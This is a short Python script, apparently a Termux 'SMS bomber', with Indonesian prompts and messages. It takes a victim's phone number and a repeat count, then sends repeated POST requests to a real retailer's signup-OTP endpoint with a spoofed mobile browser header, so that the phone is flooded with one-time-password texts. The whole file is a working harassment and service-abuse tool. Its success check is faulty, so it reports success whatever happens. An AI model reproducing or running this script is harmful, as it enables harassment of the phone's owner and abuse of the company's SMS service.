import requests
from requests import post
print ('WELCOME TO SCRIPT TERMUX ALVIAN')


url = "https://cmsapi.mapclub.com/api/signup-otp"


nomor = str(input("MASUKAN NOMOR:"))
jumlah = int(input("MASUKAN JUMLAH:"))


data = {
'phone':nomor
}

header = {
'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36',
'Host': 'cmsapi.mapclub.com',
'Connection': 'keep-alive'
}


for x in range(jumlah):
        h = requests.post(url, data=data, headers=header)
        if 'error' in h:
                print('gagal')
        else:
                print('SUKSES DARI GW ALVIAN')
